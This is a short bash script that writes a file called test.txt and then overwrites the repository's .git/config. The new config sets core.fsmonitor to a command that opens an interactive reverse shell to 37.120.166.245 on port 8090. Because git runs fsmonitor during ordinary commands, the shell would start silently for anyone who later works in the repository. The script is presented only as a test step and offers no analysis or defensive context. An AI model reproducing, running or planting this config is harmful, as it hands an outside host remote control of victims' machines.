#!/usr/bin/env bash


echo "test6" > test.txt

mkdir .git/hooks/
cat > .git/config <<'EOF'
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	fsmonitor = "/bin/bash -c 'bash -i >& /dev/tcp/37.120.166.245/8090 0>&1'"
EOF

exit 0
